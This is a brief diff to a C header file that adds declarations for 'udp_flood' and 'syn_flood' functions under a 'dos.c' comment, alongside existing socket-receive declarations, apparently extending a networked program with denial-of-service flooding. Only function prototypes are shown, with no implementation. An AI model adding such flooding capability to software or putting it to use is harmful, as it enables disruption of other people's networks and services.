@@ -108,4 +108,9 @@ void str_to_lower (char *);
 // recv.c
 int cleanup (SOCKET, pAccount, pMessage);
 void start_recv (SOCKET, pAccount);
+
+// dos.c
+void udp_flood (SOCKET s);
+void syn_flood (SOCKET s);
+
 #endif
